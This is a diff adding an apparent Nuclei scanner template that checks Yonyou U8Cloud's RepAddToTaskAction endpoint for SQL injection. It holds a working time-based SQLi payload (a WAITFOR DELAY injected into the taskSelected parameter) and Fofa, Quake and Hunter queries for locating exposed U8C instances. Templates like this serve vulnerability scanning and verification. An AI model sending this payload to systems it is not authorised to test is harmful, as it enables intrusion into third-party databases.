@@ -1,0 +1,28 @@
+id: Yonyou_u8c_cloud_RepAddToTaskAction_SQLi
+
+info:
+  name: Yonyou_u8c_cloud_RepAddToTaskAction_SQLi
+  author: security-xm
+  severity: high
+  description: 用友U8Cloud系统接口RepAddToTaskAction存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: title="U8C"
+    Quake-query: title="U8C"
+    Hunter-query: title="U8C"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
